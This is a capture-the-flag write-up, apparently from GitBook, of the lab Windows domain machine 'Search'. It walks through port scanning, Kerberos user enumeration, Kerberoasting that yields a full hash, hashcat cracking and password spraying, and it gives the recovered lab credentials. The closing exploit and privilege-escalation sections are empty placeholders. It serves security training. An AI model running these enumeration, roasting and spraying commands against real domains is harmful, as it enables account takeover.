# Search (Hard)

<figure><img src="../../../.gitbook/assets/Search.png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
# Nmap 7.93 scan initiated Sun Nov  6 10:47:32 2022 as: nmap -sV -sC -v -p- -oN Search_TCP 10.129.227.156
Nmap scan report for 10.129.227.156
Host is up (0.035s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Search &mdash; Just Testing IIS
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-06 15:49:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-11-06T15:50:54+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738614f7bc029d06d1d9ea63cdbd99e
|_SHA-1: 10ae549429d61e44276fb8a224cafde9de93af78
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_ssl-date: 2022-11-06T15:50:54+00:00; +1s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738614f7bc029d06d1d9ea63cdbd99e
|_SHA-1: 10ae549429d61e44276fb8a224cafde9de93af78
|_http-title: Search &mdash; Just Testing IIS
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-11-06T15:50:54+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738614f7bc029d06d1d9ea63cdbd99e
|_SHA-1: 10ae549429d61e44276fb8a224cafde9de93af78
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-11-06T15:50:54+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738614f7bc029d06d1d9ea63cdbd99e
|_SHA-1: 10ae549429d61e44276fb8a224cafde9de93af78
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738614f7bc029d06d1d9ea63cdbd99e
|_SHA-1: 10ae549429d61e44276fb8a224cafde9de93af78
|_ssl-date: 2022-11-06T15:50:57+00:00; 0s from scanner time.
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-11-06T15:50:54+00:00; +1s from scanner time.
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Issuer: commonName=WMSvc-SHA2-RESEARCH
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-07T09:05:25
| Not valid after:  2030-04-05T09:05:25
| MD5:   eeb9303e6d46bd8b34a01ed60eb83287
|_SHA-1: 1e069fd0ef45b05178b2c6bf1bed975ea87d0458
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
49733/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-06T15:50:18
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  6 10:51:01 2022 -- 1 IP address (1 host up) scanned in 208.97 seconds

```

Enumerated UDP ports:

```
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
```

Notes:

* 53/DNS -- <mark style="color:yellow;">search.htb</mark> (added to /etc/hosts)
* 80/HTTP -- IIS server&#x20;
  * List of users
* 88/Kerberos -- List of users -- AS-REPRoasting?
* 443/HTTPs -- Different attack surface? <mark style="color:yellow;">research.search.htb</mark>

## Enumeration

### Port 88 - Kerberos

User Enumeration

* I decided to use namemash.py to gather all of the users in a text file and mash them into different naming conventions

<figure><img src="../../../.gitbook/assets/image (11) (2) (2).png" alt=""><figcaption></figcaption></figure>

namemash.py:

```
python3 namemash.py usernames.txt > namemash.txt
```

Username Enumeration:

```
./kerbrute_linux_amd64 userenum -d search.htb namemash.txt --dc 10.129.227.156

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/06/22 - Ronnie Flathers @ropnop

2022/11/06 12:11:02 >  Using KDC(s):
2022/11/06 12:11:02 >   10.129.227.156:88

2022/11/06 12:11:02 >  [+] VALID USERNAME:  keely.lyons@search.htb
2022/11/06 12:11:02 >  [+] VALID USERNAME:  dax.santiago@search.htb
2022/11/06 12:11:02 >  [+] VALID USERNAME:  sierra.frye@search.htb
2022/11/06 12:11:03 >  Done! Tested 88 usernames (3 valid) in 0.323 seconds
```

* <mark style="color:yellow;">We get three valid usernames!</mark>

### Port 443 - HTTPs

<figure><img src="../../../.gitbook/assets/image (18) (3).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">Added research.search.htb to /etc/hosts</mark>

### Visual Inspection of Site

<figure><img src="../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

* I was stuck on this for a very long time...
* If we look closely, we can see a username and a password that is on the notebook picture on the site

Username:&#x20;

<mark style="color:yellow;">Hope Sharp -- hope.sharp</mark>

Password:

<mark style="color:yellow;">IsolationIsKey?</mark>

* I used Kerbrute's user enumeration and confirmed that it is a valid user

<figure><img src="../../../.gitbook/assets/image (3) (6) (2).png" alt=""><figcaption></figcaption></figure>

### Enum4Linux Enumeration (Authenticated)

Credentials- <mark style="color:yellow;">hope.sharp:IsolationIsKey?</mark>

```
enum4linux -a -u 'hope.sharp' -p 'IsolationIsKey?' 10.129.14.143
```

* This gives me lots of information as well as all of the users on the machine

### GetUserSPNs

```
impacket-GetUserSPNs -dc-ip 10.129.14.143 'search.htb/hope.sharp:IsolationIsKey?' -request
```

* According to the results, I am able to get a service account but I cannot get a hash
* Let's try to fix this by syncing the time

Ntpdate:

```
sudo ntpdate search.htb
```

web\_svc Kerberos TGS hash:

{% code overflow="wrap" %}
```
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$7dca81e6705bcdb01752c57818dd6f72$697ad7eb3541b592481adca12897111d55301ad38764a3f2df1944e8b0c10b7b7d0cc14fddc149bc4eac53607901472b8aadaed27b002605ba7307569c30e73b1827e66b1b71b4f46158817699a812fad26b83b6dcd326a7988f1d0464477fdff9bc8c3c89ecdb1f98d33200ba8239c8c70d0b852dc4b1e0ac463b4aa8868ed8655e7795892b303e71f8c95a91468ef0b96e3700b3a342be31d3b8dee92f161bf849c595f6369c5376e14b81582e8002da8f47b11f4ffa530c08501de05bbe1cc3f74ba8dc3e8e2e19836dbe639e71eb5fb85b0274855e000e16c4c9f70b69974f4e0f501a2558e7392157d54edde75aed5c3ba680dbcbb448c512e848e78ff442cf60740e7e90d575bc109ff085a6cbc36309240448278b8c9caa9d2fb1ac81651eabe7f506dbd6c7a98f47981165a8a655e861ff71cdb61c4ef3e4666ff018b8d4700fc3d07ba4882889163a89270871ba655cd01ba0170e51c80fa58e902848b24322325a4e677483b21a446033c77634e7b04a091de232eb6c55f6b26e167ca2f089eed0a1cccfe63cd0d6839e04350ad80e6b0e747c44a482d716350cc1c1257ad3a2f2c278b80dfca626f228bfda0a96de986dae260397ef2c1c136adb16101fe059f7f8d7790002ec639685a2038cbdd12746933bf86f3083928fb465ca231a126be5e4b991281ad50d51466e63eb1e53901d79c50f94204cdc9510394efcdcee497494702558213c2007b14d60c28ba36ed763c99c4de7f0d29f2b2dc3165c82f1b90772fe3b311faa4acb818f4ac28d0dc9d4598655a28bb1ddab698f6b23943e912189e38aeb90bc88cdae325793ec4f54a01a34f1eea89e2a92f905f33061265dab5ef0060f110922be6b72ce538cb7ff3140446c91b19c98e709a58d306dd0cc6d850557fb63126bcc00ef2a5b290a0074cbd8206f187484e3dd00e323f510437acd53eb86fe252ac2b5fcc4c0eb9eb8060dfa81165634f3938e9cb227b29aaeb4e8ef38d3b38a5c463539b8107728b8d01006b7abe3fc421b921e10c59fed1344e0aaad0af76c4755fff2198077deccf6810d5f436a0df28e56c7ad1603e6afbf9c9b9fcb8e99050e44b4ab25d65ea2763c449f9c72541deafb88aeb9c15d4c68beaa73454a2de37c8c4eab15e6ff03768af41b0efceaa717ddb60d0a952e4caa7f6e01fc46485c7e773fe61bb3e1af6bd8a5d1a214626e4a0ca009dc44f42d9a9bdf503f215ce01cae12f55beb2542a4f4b724c9632e89881b9735d6ac5697f5b5a67819c30e1c002c93c96961867dcc0a4dc6c3cbafc3fe62c8b3dcfc203e010027712563ba59cf75ee3c1076a48ce6dfc62ddbb242bbdeb01f0510d9105e0626f404de04f531a271db8290422ecb65a6bc28d76fa8deaa608ea09dfe4289af14c13a8472d39a476b758598bb3959f47c5900c1f1a96cf60f8238a0146414066598b0a9955cd1b327c57b420673
```
{% endcode %}

### Cracked Offline w/ Hashcat

```
.\hashcat.exe hash.txt -m 13100 .\rockyou.txt
```

<figure><img src="../../../.gitbook/assets/image (13) (5) (1).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">web\_svc:@3ONEmillionbaby</mark>

### Password Spraying w/ CrackMapExec&#x20;

```
crackmapexec smb search.htb -u results -p '@3ONEmillionbaby'

SMB         search.htb      445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby 
```

* <mark style="color:yellow;">edgar.jacobs:@3ONEmillionbaby</mark>

### SMB Share Enumeration w/ CrackMapExec

```
crackmapexec smb search.htb -u edgar.jacobs -p '@3ONEmillionbaby' --shares
```

<figure><img src="../../../.gitbook/assets/image (14) (4) (1).png" alt=""><figcaption></figcaption></figure>



### Name of the technique

This is the exploit

## Privilege Escalation

### Local enumeration

### PrivEsc vector
